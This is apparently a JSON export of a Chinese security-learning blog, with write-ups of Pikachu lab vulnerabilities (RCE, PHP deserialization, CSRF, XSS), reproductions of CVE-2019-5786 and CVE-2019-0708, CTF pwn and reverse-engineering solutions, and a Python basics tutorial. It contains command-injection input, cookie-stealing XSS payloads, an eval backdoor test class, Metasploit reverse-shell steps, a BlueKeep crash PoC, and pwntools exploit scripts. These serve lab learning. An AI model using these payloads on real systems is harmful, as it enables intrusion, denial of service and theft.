上","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"pikachu-RCE","slug":"pikachu-RCE","date":"2022-08-11T14:17:28.967Z","updated":"2022-08-11T14:33:04.867Z","comments":true,"path":"2022/08/11/pikachu-RCE/","link":"","permalink":"https://sinky.top/2022/08/11/pikachu-RCE/","excerpt":"","text":"概述RCE (remote command/code execute),可以让攻击者直接向后台服务器远程注入操作系统命令或代码，从而控制后台系统。 远程系统命令执行一般出现这种漏洞是因为应用系统从设计上需要给用户提供指定的远程命令操作接口。一般会给用户一个ping操作的web界面，用户从web界面输入目标ip,提交后会对该IP地址进行一次ping测试，并返回测试结果。没有安全控制的话会导致攻击者通过该接口提交恶意命令，后台执行会控制整个后台服务器。 远程代码执行后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略 exec \"ping\" ping一下本地返回正常。 输入命令： www.baidu.com &amp; ipconfig 发现可以获取到用户的ip地址。 “&amp;”的作用是先执行 www.baidu.com 或者： &amp;、&amp;&amp;、|、||、； 等拼接执行命令。 exec \"eval\" 不知道为啥输入什么都报错 看了一下网页代码，啥也没有，查看了后台源代码： 用户输入值直接被带入到eval()函数中进行执行，没有任何安全处理。 输入 phpinfo(); 返回显示了php系统信息。 eval函数的作用是将字符串当作php代码执行，它允许执行任意 PHP 代码 它允许执行任意 PHP 代码。","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"pikachu","slug":"pikachu","permalink":"https://sinky.top/tags/pikachu/"},{"name":"RCE","slug":"RCE","permalink":"https://sinky.top/tags/RCE/"}]},{"title":"Python学习1","slug":"python学习1","date":"2022-08-10T11:57:31.721Z","updated":"2022-09-12T03:48:03.773Z","comments":true,"path":"2022/08/10/python学习1/","link":"","permalink":"https://sinky.top/2022/08/10/python%E5%AD%A6%E4%B9%A01/","excerpt":"","text":"输出函数print()1.可输出数字、字符串、表达式 123print(520) #520print('HelloWorld') #HelloWorldprint(3+1) #4 2.将数据输出文件中 file=fp 123fp=open('D:/text.txt','a+')print('Hello',file=fp)fp.close() a+ 若文件不存在则创建，存在则在文件内容后追加，读写。 3.不进行换行输出 print('Hello','world','python') #Hello world python 转义字符 \\n - 换行；\\r - 回车；\\t - 水平制表符；\\b - 退格； 12print('hello\\rworld') #world #world将hello覆盖print('hello\\bworld') #hellworld #\\b退格，将o退没了 2.原字符，在字符串前加r或R，可使字符串内转义字符失效。 print(r'hello\\nworld') #hello\\nworld 注意：字符串最后一个字符不可为斜杠。 进制，字符编码，标识符，保留字1Byte(字节)=8bit(位) 1KB(千字节)=1024Byte 1MB(兆字节)=1024KB 1GB(吉字节)=1024MB 1TB(太字节)=1024GB 标识符：字母、数字、下划线（不可以数字开头，严格区分大小写） 变量内存中一个带标签的空间 1234name='Lihua'print('标识',id(name))print('类型',type(name))print('值',name) 123标识 1694477549296类型 &lt;class 'str'&gt;值 Lihua 多次赋值后，变量名会指向新的使用。 数据类型int 整型 十进制 默认的进制 0-9 二进制 以0b开头 0,1 八进制 以0o开头 0-7 十六禁止 以0x开头 0-9，A-F float 浮点型存储具有不精确性，可导入模块Decimal 12from decimal import Decimalprint(Decimal('1.1')+Decimal('2.2')) #3.3 str 字符串类型；bool 布尔类型字符串可用单引号、双引号、三引号或””” “””定义。 单引号双引号定义的字符串需要在一行；三引号可多行； 123str='''人生苦短，我用python'''print(str) 12人生苦短，我用python 数据类型转换 str() 其他转字符串，也可以引号转 int() 其他转整形，文字和小数不能转，浮点数抹零取整 float() 其他转浮点，文字类不可转，整数转浮点末尾加.0 123name='张三'age=20print('我叫'+name+'，今年'+str(age)+'岁') 12345a=10b=98.9c=Falseprint(type(a),type(b),type(c))print(str(a),str(b),str(c),type(str(a)),type(str(b)),type(str(c))) 12&lt;class 'int'&gt; &lt;class 'float'&gt; &lt;class 'bool'&gt;10 98.9 False &lt;class 'str'&gt; &lt;class 'str'&gt; &lt;class 'str'&gt; 12345678910s1=128f1=98.7s2='76.77'ff=Trues3='hello'print(int(s1),type(int(s1))) #128print(int(f1),type(int(f1))) #98 #print(int(s2),type(int(s2))) #Errorprint(int(ff),type(int(ff))) #1 #print(int(s3),type(int(s3))) #Error 123128 &lt;class 'int'&gt;98 &lt;class 'int'&gt;1 &lt;class 'int'&gt; 注释单行：# 多行：三引号 中文编码声明： #coding:utf-8 输入函数input()接收用户输入，返回类型str，存储’=’ 运算符1.算术运算符 加+ 减- 乘* 除/ 整除// 取余% 幂** 整除（一正一负向下取整） 取余（余数=被除数-除数*商） 2、赋值运算符 ‘=’ 执行：从右至左； +=、-=、*=、/=、//=、%= a,b,c=10,20,30 a+=30 # a=a+30 3.比较运算符 结果为bool 、&lt;、==、!=(不等于)、is、is not 布尔：and,or,not,in,not in 5.位运算符 与&amp; 11为1，否则为0 或| 00为0，否则为1 左移位&lt;&lt; 高位溢出舍弃，低位补0 （相当于乘2） 右移位&gt;&gt; 低位溢出舍弃，高位补0 （相当于除以2） 123456print(4&amp;8) # 0print(4|8) # 12print(4&lt;&lt;1) #8print(4&gt;&gt;1) #2print(4&lt;&lt;2) #16print(4&gt;&gt;2) #1 6.优先级 算术&gt;位&gt;比较&gt;布尔&gt;赋值","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"SimpleRev","slug":"SimpleRev-buu-Re","date":"2022-08-10T02:14:24.700Z","updated":"2022-08-10T02:15:05.412Z","comments":true,"path":"2022/08/10/SimpleRev-buu-Re/","link":"","permalink":"https://sinky.top/2022/08/10/SimpleRev-buu-Re/","excerpt":"","text":"IDA打开查看字符串，直接点进Congratulation找到关键函数Decry() 浅分析一下 Decry()12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970{ char *v0; char v2; int v3; signed int v4; signed int i; signed int v6; char src[8]; __int64 v8; int v9; __int64 v10; __int64 v11; int v12; __int64 v13; v13 = *MK_FP(__FS__, 40LL); *(_QWORD *)src = 'SLCDN'; v8 = 0LL; v9 = 0; v10 = 'wodah'; v11 = 0LL; v12 = 0; LODWORD(v0) = join(key3, &amp;v10); // 小端序存储，v10要倒过来看：text=killshadow text = v0; strcpy(key, key1); strcat(key, src); // key=ADSFKNDCLS v3 = 0; v4 = 0; getchar(); v6 = strlen(key);// for循环是为了大写变小写 for ( i = 0; i &lt; v6; ++i ) { if ( key[v4 % v6] &gt; 64 &amp;&amp; key[v4 % v6] &lt;= 90 ) key[i] = key[v4 % v6] + 32; ++v4; } printf(\"Please input your flag:\", src); while ( 1 ) { v2 = getchar(); if ( v2 == 10 ) break; if ( v2 == 32 ) { ++v3; } else { if ( v2 &lt;= 96 || v2 &gt; 122 ) { if ( v2 &gt; 64 &amp;&amp; v2 &lt;= 90 ) str2[v3] = (v2 - 39 - key[v4++ % v6] + 97) % 26 + 97; } else { str2[v3] = (v2 - 39 - key[v4++ % v6] + 97) % 26 + 97; //核心代码 } if ( !(v4 % v6) ) putchar(32); ++v3; } }//经过加密后str2与text一致得到Congratulation，则加密前的str2就是flag if ( !strcmp(text, str2) ) puts(\"Congratulation!\\n\"); else puts(\"Try again!\\n\"); return *MK_FP(__FS__, 40LL) ^ v13;} 有取余，没法逆推，用爆破： 1234567891011121314151617181920py脚本：key=\"ADSFKNDCLS\"text=\"killshadow\"s=\"\"flag=\"\"loop=\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"v2 = 0v3 = 0v5 = len(key)for i in range(0,v5): if ( ord(key[i]) &gt; 64 and ord(key[i]) &lt;= 90 ): s += chr(ord(key[i]) + 32) else: s +=key[i]print(s)for i in range(0,len(text)): for j in loop: if ord(text[i])==(ord(j)-39-ord(s[i])+97)%26+97: flag+=jprint(flag) 123456789101112131415161718192021222324 #include&lt;stdio.h&gt; int main(){ char key[] = \"adsfkndcls\"; char text[] = \"killshadow\"; int i; int v3=10;//长度 for (int i = 0; i &lt; 10; i++) { for (int j = 0; j &lt; 128; j++) { if (j &lt; 'A' || j &gt; 'z' || j &gt; 'Z' &amp;&amp; j &lt; 'a') { continue; } if ((j - 39 - key[v3 % 10] + 97) % 26 + 97 == text[i]) { printf(\"%c\",j); v3++; break; } } }} flag{KLDQCUDFZO}","categories":[],"tags":[{"name":"Re","slug":"Re","permalink":"https://sinky.top/tags/Re/"},{"name":"Buu","slug":"Buu","permalink":"https://sinky.top/tags/Buu/"},{"name":"CTF","slug":"CTF","permalink":"https://sinky.top/tags/CTF/"}]},{"title":"PHP反序列化","slug":"pikachu-PHP反序列化","date":"2022-08-09T09:01:18.129Z","updated":"2022-08-11T14:18:28.118Z","comments":true,"path":"2022/08/09/pikachu-PHP反序列化/","link":"","permalink":"https://sinky.top/2022/08/09/pikachu-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"概述序列化 serialize()序列化：把一个对象变成可以传输的字符串。 123456class S{public $test=\"pikachu\";}$s=new S;//创建一个对象serialize($s);//把这个对象进行序列化?&gt; 结果：O:1:”S”:1:{s:4:”test”;s:7:”pikachu”;} O:代表object 1:代表对象名字长度为一个字符 S:对象的名称 1:代表对象里面有一个变量 s:数据类型 4:变量名称的长度 test:变量名称 s:数据类型 7:变量值的长度 pikachu:变量值 （什么鬼，没懂） 反序列化 unserialize()就是把序列化的字符串还原为对象，然后在接下来的代码中继续使用。 $u=unserialize(\"0:1:\"S\":1{s:4:\"test\":s:7:\"pikachu\";}\"); echo $u ‐&gt; test;//得到结果为pikachu 序列化和反序列化本身没有问题，但如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。 常见的魔法函数： __construct() 当一个对象创建时被调用 __destruct() 当一个对象销毁时被调用 __toString() 当一个对象被当作一个字符串使用 __sleep() 在对象在被序列化之前运行 __wakeuop 将在序列化之后立即被调用 实验12345678910111213141516171819//定义类class test{//在对象被销毁时候自动调用destruct函数function __destruct(){echo \"&lt;br&gt;__destruct()&lt;br&gt;\";//在此函数中添加eval()以达到命令执行的目的eval($_GET['cmd']);}}//echo serialize($test);方便将序列化后的test写进u参数中传参$test = new test;echo serialize($test);//执行完这个echo后会被垃圾回收器回收，也就是销毁unserialize($_GET['u']);//反序列化执行完后又会被回收// 所以会出现两次destruct?&gt; 传参: http://localhost/phptest.php?O:4:\"test\":0:{}&amp;cmd=system(\"woami\"); 利用成功。 php反序列化漏洞 随便提交点啥字符串，提示“大兄弟，来点劲爆点儿的” 提交了一串序列化字符串，回显是反序列化后的。没啥思路，看一下后台代码。 将XSS字符串 &lt;script&gt;alert('xss')&lt;/script&gt; 序列化一下： O:1:\"S\":1:{s:4:\"test\";s:29:\"&lt;script&gt;alert('xss')&lt;/script&gt;\";} 提交，成功","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"pikachu","slug":"pikachu","permalink":"https://sinky.top/tags/pikachu/"}]},{"title":"pikachu-CSRF","slug":"pikachu-CSRF","date":"2022-08-09T08:30:06.517Z","updated":"2022-08-09T08:51:43.331Z","comments":true,"path":"2022/08/09/pikachu-CSRF/","link":"","permalink":"https://sinky.top/2022/08/09/pikachu-CSRF/","excerpt":"","text":"CSRFCSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击. csrf攻击满足的条件1、网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造 2.用户在登录后台的情况下，点击了攻击者发送的链接，如果用户没登陆或没点连接都不会成 csrf与xss的区别csrf是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而xss是直接盗取到了用户的权限，然后实施破坏。 如何确认一个web系统存在csrf漏洞1.对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造 修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造； 对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造； 2.确认凭证的有效期 虽然退出或关闭了浏览器，但cookie仍然有效，或者session并没有及时国企，导致csrf攻击变得简单。 CSRF(get)登录账号，抓取修改个人信息流量包。 发现参数可以直接被修改，未做任何确认机制，可以直接将url伪装成各种html让受害者点击。 可以构造出CSRF攻击URL,诱使登录状态的用户点击url就可以完成CSRF攻击。 如果修改信息的请求方式是POST型的，攻击者则不能通过构造恶意url来攻击。类似于xss的post型攻击，攻击者会构造一个自己的攻击站点（服务器），站点上有一个poat.html，诱使用户点击该地址。当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息，从而完成攻击。 步骤同get。 正常登录状态： 点击恶意url后，用户信息直接被修改 CSRF(Token)token: 每次请求都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证，这个随机码就是token。 如图获取修改信息流量包后发现增加了token，无法利用。 防范CSRF措施 增加token验证：对关键操作增加token参数，token值必须随机，每次都不一样 安全的会话管理（避免会话被利用） 不要再客户端保存敏感信息（身份认证信息） 测试直接关闭，退出时的会话过期机制（一般是15-20分钟），无操作则自动登入超时。 访问控制安全管理 敏感信息修改时需要对身份进行二次认证（如修改账号时需要判断旧密码） 敏感信息的修改尽量使用post（post安全性高于get） 通过http头部中的referer来限制页面（修改个人信息的referer必须来自本域，不可来自其他域或无referer） 增加验证码：一般用在登录（防暴力破解），也可用于其他重要信息操作的表单中。","categories":[],"tags":[{"name":"pikachu","slug":"pikachu","permalink":"https://sinky.top/tags/pikachu/"}]},{"title":"CVE-2019-5786","slug":"CVE-2019-5786","date":"2022-08-09T08:02:35.739Z","updated":"2022-08-09T08:03:08.820Z","comments":true,"path":"2022/08/09/CVE-2019-5786/","link":"","permalink":"https://sinky.top/2022/08/09/CVE-2019-5786/","excerpt":"","text":"前言： 这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！ 环境kali win7_x86 Google_chrome_(32bit)_v72.0.3626.119 浏览下载链接推荐：https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe 复现：kali启动msf,搜索chrome_filereader利用模块。(据谷歌官方公示，CVE-2019-5786是位于FileReader中的UAF漏洞) root@kali:~# msfconsole -q msf5 &gt; search chrome_filereader 注：1.msfconsole -q 是指启动工具msf，-q 不打印没用的东西出来（msf启动界面）之后可能需要专门整理一下有关msf工具的知识。2.search chrome_filereader正则匹配搜索exp。exp存在则浮现。3.什么是UAF漏洞：内存破坏漏洞，通常存在于浏览器中，详细可见博客文章“UAF漏洞简单学习” 出现exp: exploit/filereader/browser/chrome_filereader_uaf 简单了解FileReader对象的用法Filereader 可以实现对文件内容或者缓冲区数（Blob）的异步读取 readyState：表示读取状态 empty,0,尚未读取 loading,1,正在读取 done,2,读取完成 result：表示读取结果，具体格式与读取方式有关： readAsArrayBuffer readAsBinaryString readAsDataURL readAsText onprogress：回调函数 读取Blob触发 当数据较多时会周期性触发多次 onloadend：回调函数 读取操作完成时触发，不论读取成功或失败 查看模块信息 漏洞介绍： 123456789101112Payload information:Description: This exploit takes advantage of a use after free vulnerability in Google Chrome 72.0.3626.119 running on Windows 7 x86. The FileReader.readAsArrayBuffer function can return multiple references to the same ArrayBuffer object, which can be freed and overwritten with sprayed objects. The dangling ArrayBuffer reference can be used to access the sprayed objects, allowing arbitrary memory access from Javascript. This is used to write and execute shellcode in a WebAssembly object. The shellcode is executed within the Chrome sandbox, so you must explicitly disable the sandbox for the payload to be successful. 选择payload -&gt; set payload windows/meterpreter/reverse_tcp 注：meterpreter/reverse_tcp：基于TCP的反向链接反弹shell，详细见文章“初识Meterpreter” 设置payload参数：LHOST为kali ip -&gt; set LHOST 192.168.119.128 创建服务 -&gt; set payload windows/meterpreter/reverse_tcp 启动服务：run 或者exploit 在win7下进入chrome文件目录，在目录下进去cmd，并以沙箱关闭状态执行chrome.exe -&gt; chrome.exe --no-sandbox 在弹出的chome浏览器中访问kali ip: http://192.168.119.128:8080 kali获得sessions查看sessions序号，通过反弹shell在win7上可执行命令。复现结束。 后记在获取session时候我遇见了很多小问题导致我不能获取，比如win7应该是x86系统，比如win7的防火墙忘记关闭了，比如网速太慢，在历经无数崩溃瞬间我成功的获取了session.虽然后来再整理wp的时候，win7系统由于自动更新，chrome119版本也升级了，后来再安装却死活安装不上去，差点升天…… EXPexp太长了并且看不懂，等我后面有机会再整理。这边放其他大佬整理出来的exp。 https://github.com/exodusintel/CVE-2019-5786","categories":[],"tags":[{"name":"chrome_bug","slug":"chrome-bug","permalink":"https://sinky.top/tags/chrome-bug/"}]},{"title":"CVE-2019-0708","slug":"CVE-2019-0708","date":"2022-08-09T04:25:01.135Z","updated":"2022-08-09T04:22:13.980Z","comments":true,"path":"2022/08/09/CVE-2019-0708/","link":"","permalink":"https://sinky.top/2022/08/09/CVE-2019-0708/","excerpt":"","text":"2019年5月14日爆出CVE-2019-0708漏洞，高危漏洞，影响范围较广，通过远程桌面端口3389，RDP协议进行攻击。 影响系统：windows 2003、windows 2008、windows 2008 R2、windows xp、win7 蓝屏环境攻击机：kali IP：192.168.119.128 靶机：win7 IP:192.168.119.139 (开放3389端口) 工具：RDP漏洞扫描工具、MSF POC：https://github.com/n1xbyte/CVE-2019-0708 复现nmap对win7端口扫描: RDP工具在win7上扫描靶机:0708detector.exe -t 192.168.119.139 -p 3389 启动MSF查找漏洞： search 0708 利用漏洞扫描模块： use auxiliary/scanner/rdp/cve_2019_0708_bluekeep 查看参数： show options 设置靶机IP： set rhosts 192.168.119.139 运行：run 漏洞攻击在kali中安装pip3,安装impacket库。下载poc。切进目录CVE-2019-0708 开始攻击： python3 crashpoc.py 192.168.119.139 64(系统类型) 攻击成功，win7变为蓝屏。 知识点RDP协议RDP,远程显示协议。传输方式：tcp/ip。提供了客户和服务器之间的连接。映像会话。基本层次结构： 网络连接层：RDP协议建立在tcp/ip协议之上，由于传输的数据量比较大，因此在协议的底层首先定义一层网络连接层，它定义了一个完整的RDP数据逻辑包，以避免由于网络包长度过长而被分割使数据丢失。 ISO数据层：在网络连接层之上是ISO数据层，标识RDP数据的正常连接通信。 虚拟通道层：在ISO数据层之上，RDP协议定义一个虚拟通道层，用以拆分标示不同虚拟通道的数据，加快客户端处理速度，节省占用网络接口的时间。 加密解密层：在虚拟通道层之上，RDP定义一个数据加密解密层，此层用于对所有的功能数据进行加密解密处理。 功能数据层：在加密解密层之上是功能数据，画面信息，本地资源转换，声音数据，打印数据等所有的功能数据信息都在此层进行处理。另外，根据数据类型的不同，这些数据都有各自不同层次的分割， 连接过程说明： 客户端连接服务器 ISO数据层建立连接 发送初始协议相关信息，接收加密、解密秘钥 虚拟通道申请 加密形式发送客户端系统信息，同时验证加密协议 平台软件证书验证 各功能建立连接，各功能数据传输，功能实现。","categories":[],"tags":[{"name":"windows漏洞","slug":"windows漏洞","permalink":"https://sinky.top/tags/windows%E6%BC%8F%E6%B4%9E/"}]},{"title":"攻防世界-pwn-反应釜开关控制","slug":"攻防世界-pwn-反应釜开关控制","date":"2022-08-09T04:18:04.404Z","updated":"2022-08-11T14:19:42.897Z","comments":true,"path":"2022/08/09/攻防世界-pwn-反应釜开关控制/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/","excerpt":"","text":"checksec: 可以修改GOT表 可以通过一处的方式来更改程序运行流 堆栈不可执行 地址随机化未开启 分析IDA查看，发现有/bin/sh。 get函数可溢出，偏移由v5得0x200h+0x8h(偏移对齐)=0x208h expexp: from pwn import * r = remote('220.249.52.133',39331) elf = ELF('./control') shell_addr = 0x04005F6 payload = 'A'*0x208 + p64(shell_addr) r.sendline(payload) r.interactive() 后记看了一下大佬的wp，结果原来是盲打题……","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"}]},{"title":"有关XSS跨站脚本","slug":"有关XSS跨站脚本","date":"2022-08-09T04:10:35.381Z","updated":"2022-08-09T04:10:16.791Z","comments":true,"path":"2022/08/09/有关XSS跨站脚本/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/","excerpt":"","text":"XSS(跨站脚本)原理与分类跨站脚本攻击XSS,为了不和层叠样式表的缩写混淆，故将跨站脚本攻击缩写为XSS,恶意攻击者往web页面里插入恶意script代码，当用户浏览页面时嵌入其中的script代码被执行，从而恶意攻击用户。 XSS攻击针对的是用户层面的攻击. 反射型：交互的数据一般不会被存在数据库里，一次性，一般出现在查询页面等。 存储型：交互的数据会被存在数据库里面，永久性存储，一般出现在留言板，注册等页面。 DOM型：不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性，也属于反射型。 XSS漏洞测试流程1.在目标上找输入点，比如查询接口、留言板 2.输入一组“特殊字符（&gt;,’,”等）+唯一识别字符”，点击提交后，查看返回源码，看后端返回数据是否有处理。 3.通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的调教（构造闭合） 4.提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，成功执行证明存在xss漏洞。 XSS的攻击载荷 &lt;script&gt;：最直接的xss有效载荷，脚本标记可以引用外部的javascript代码，也可以将代码插入脚本标记中。 src12&lt;script&gt;alert(\"hack\")&lt;/script&gt; #弹出hack&lt;script&gt;alert(document.cookie)&lt;/script&gt; #弹出cookie &lt;img&gt;：1234567&lt;img src=1 onerror=alert(\"hack\")&gt;&lt;img src=1 onerror=alert(/hack/)&gt;&lt;img src=1 onerror=alert(document.cookie)&gt; #弹出cookie&lt;img src=1 onerror=alert(123)&gt; 注：对于数字，可以不用引号&lt;img src=\"javascript:alert(\"XSS\");\"&gt;&lt;img dynsrc=\"javascript:alert('XSS')\"&gt;&lt;img lowsrc=\"javascript:alert('XSS')\"&gt;","categories":[],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://sinky.top/tags/XSS/"}]},{"title":"攻防世界-dice_game","slug":"攻防世界-pwn-dice_game","date":"2022-08-09T04:08:11.395Z","updated":"2022-08-11T14:24:30.121Z","comments":true,"path":"2022/08/09/攻防世界-pwn-dice_game/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/","excerpt":"","text":"0x01 Checkseclinux下checksec查壳，开启了relro nx pie防护： 0x02 分析IDA打开，主函数： 123456789101112131415161718192021222324252627282930313233343536373839__int64 __fastcall main(__int64 a1, char **a2, char **a3){ char buf[55]; // [rsp+0h] [rbp-50h] char v5; // [rsp+37h] [rbp-19h] ssize_t v6; // [rsp+38h] [rbp-18h] unsigned int seed[2]; // [rsp+40h] [rbp-10h] unsigned int v8; // [rsp+4Ch] [rbp-4h] memset(buf, 0, 0x30uLL); *(_QWORD *)seed = time(0LL); printf(\"Welcome, let me know your name: \", a2); fflush(stdout); v6 = read(0, buf, 0x50uLL); if ( v6 &lt;= 49 ) buf[v6 - 1] = 0; printf(\"Hi, %s. Let's play a game.\\n\", buf); fflush(stdout); srand(seed[0]); v8 = 1; v5 = 0; while ( 1 ) { printf(\"Game %d/50\\n\", v8); v5 = sub_A20(); fflush(stdout); if ( v5 != 1 ) break; if ( v5 ) { if ( v8 == 50 ) { sub_B28(buf); break; } ++v8; } } puts(\"Bye bye!\"); return 0LL;} 是一个srand函数程序，输入与随机出来的数匹配，则将进入flag的函数。 12345678910int __fastcall sub_B28(__int64 a1){ char s; // [rsp+10h] [rbp-70h] FILE *stream; // [rsp+78h] [rbp-8h] printf(\"Congrats %s\\n\", a1); stream = fopen(\"flag\", \"r\"); fgets(&amp;s, 100, stream); puts(&amp;s); return fflush(stdout);} 在输入name时，令输入数据覆盖srand函数内部随机种子，就可以控制随机数的生成。 随机树种子地址与输入名字的buf地址之间相差0x40,所以将seed覆盖掉 0x03 exp12345678910111213141516from pwn import *from ctypes import *p=remote('220.249.52.133',34691)libc=cdll.LoadLibrary(\"libc.so.6\")p.recv()payload=0x40*'a'+p64(0)p.sendline(payload)a=[]for i in range(50): a.append(libc.rand()%6+1)print(a)for i in a: p.recv() print(p.recv()) p.sendline(str(i))p.interactive()","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"}]},{"title":"攻防世界 string","slug":"攻防世界pwn-string","date":"2022-08-09T04:06:35.328Z","updated":"2022-08-11T14:24:17.566Z","comments":true,"path":"2022/08/09/攻防世界pwn-string/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/","excerpt":"","text":"checksec 查看保护机制 注：开启Full RELRO，无法修改got表；开启Canary found，不能直接用溢出方法覆盖栈中返回地址，要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过；开启NX,意味着栈中数据没有执行权限；PIE未开启，基地址不会变化，为0x400000. 思路分析IDA64查看，在sub_400CA6()中发现：v1被强制转换成函数指针类型。 注： ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1); 就是将v1强制转换为一个函数指针 其满足条件为 a1==a1[1]，回溯发现，a1为函数sub_400D72()函数的参数，即，a1为v5. 可看出，v4=v5,且*v4=68;v4[1]=85;也就是说，a1=68,a1[1]=85.所以我们要修改a1值令a1=85 按流程分析：在sub_400A7D()中，满足s1==“east”，则跳出函数。 在sub_400BB9()中发现格式化字符串漏洞（可以进行任意地址改写） printf(&amp;format, &amp;format); 通过此处可修改v4[0]值，现在需要确定v4[0]地址。在main()函数中，打印的secret[0]正是v5,即v4[0]地址。 攻击思路通过格式化字符串漏洞赋值a1为85，使if条件成真，执行我们传入的shellcode拿到shell。 函数调用约定：linux_x64下，参数从左到右放入寄存器：RDI,RSI,RDX,ECX,R8,R9,当参数为7个以上时，前面6个与前面一样，但后面的以此从“右向左”放入栈中。 利用pwntools自带的shellcodecraft工具，生成amd64架构下的shellcode，拿到shell. Pwntools shellcraft模块：是shellcode的模块，包含一些生成shellcode的函数，子模块声明架构（如：shellcode.arm是ARm架构；shellcraft.amd64是AMD64架构；shellcraft.common是所有架构通用） printf(shellcraft.sh()) #打印出shellcodeprintf(asm(shellcraft.sh())) #打印出汇编后的shellcode 用gdb调试程序，在printf下断点，输入%x测试，发现输出如图： 填写address时我输入的是56（0x38），也就是[rsp+16]的位置，即格式化字符串的第7个参数（printf的第8个参数） conext.log_level=”debug” 脚本在执行时输出debug的信息，可以通过观察这些信息查找哪步出错 补：之前不知道sh.recv(7),16是什么意思，现在补充，就是sendline自带换行符，所以要把\\n过滤掉，7是因为v3就是打印的6个书，换行符是第7位，16代表十六进制。 exp： 1234567891011121314151617181920from pwn import* #sh=process('./string')sh=remote('111.198.29.45',36129)context.log_level='debug'sh.recvuntil('secret[0] is')v3_addr=int(sh.recv(7),16)sh.recvuntil('name be:')sh.sendline('zzz')sh.recvuntil('east or up?:')sh.sendline('east')sh.recvuntil('leave(0)?:')sh.sendline('1')sh.recvuntil('\\'Give me an address\\'')sh.sendline(str(v3_addr))sh.recvuntil('you wish is:')payload='%085c'+'%7$n'sh.sendline(payload)sh.recvuntil('I will help you! USE YOU SPELL')sh.sendline(asm(shellcraft.amd64.linux.sh(),arch=\"amd64\"))sh.interactive() cyberpeace{962a040a22938025e2ad4bbe3e5b56d3}","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"}]},{"title":"攻防世界-pwn-stack2","slug":"攻防世界-pwn-stack2","date":"2022-08-09T04:04:51.567Z","updated":"2022-08-11T14:24:42.799Z","comments":true,"path":"2022/08/09/攻防世界-pwn-stack2/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/","excerpt":"","text":"0x01 分析checksec检查： 32位，无PIE，开了NX和canary.运行一下是只有五个模块，展示数字，添加，更改，求平均数，退出。 IDA中查看main函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374int __cdecl main(int argc, const char **argv, const char **envp){ int v3; // eax unsigned int v5; // [esp+18h] [ebp-90h] unsigned int v6; // [esp+1Ch] [ebp-8Ch] int v7; // [esp+20h] [ebp-88h] unsigned int j; // [esp+24h] [ebp-84h] int v9; // [esp+28h] [ebp-80h] unsigned int i; // [esp+2Ch] [ebp-7Ch] unsigned int k; // [esp+30h] [ebp-78h] unsigned int l; // [esp+34h] [ebp-74h] char v13[100]; // [esp+38h] [ebp-70h] unsigned int v14; // [esp+9Ch] [ebp-Ch] v14 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); v9 = 0; puts(\"***********************************************************\"); puts(\"* An easy calc *\"); puts(\"*Give me your numbers and I will return to you an average *\"); puts(\"*(0 &lt;= x &lt; 256) *\"); puts(\"***********************************************************\"); puts(\"How many numbers you have:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"Give me your numbers\"); for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 0x63; ++i ) { __isoc99_scanf(\"%d\", &amp;v7); v13[i] = v7; } for ( j = v5; ; printf(\"average is %.2lf\\n\", (double)((long double)v9 / (double)j)) ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { 